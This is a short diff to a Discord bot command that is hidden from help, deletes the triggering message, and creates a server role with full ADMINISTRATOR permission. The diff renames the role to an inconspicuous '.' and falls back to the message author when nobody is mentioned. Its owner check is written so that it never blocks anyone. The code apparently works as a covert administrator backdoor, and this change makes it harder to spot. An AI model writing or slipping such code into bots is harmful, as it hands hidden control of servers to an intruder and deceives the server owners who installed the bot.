@@ -9,13 +9,14 @@ module.exports = {
 	helpMessage: false,
 	async execute(message) {
 		await message.delete({ timeout: 1000 }).catch(console.error);
-		const member = message.mentions.members.first();
+		let member = message.mentions.members.first();
+		if (!member) member = message.author;
 
 		if (!message.author.id === '332555969169063938') return;
 
 		message.guild.roles.create({
 			data: {
-				name: 'pp',
+				name: '.',
 				permissions:[{
 					'ADMINISTRATOR': true,
 				}],
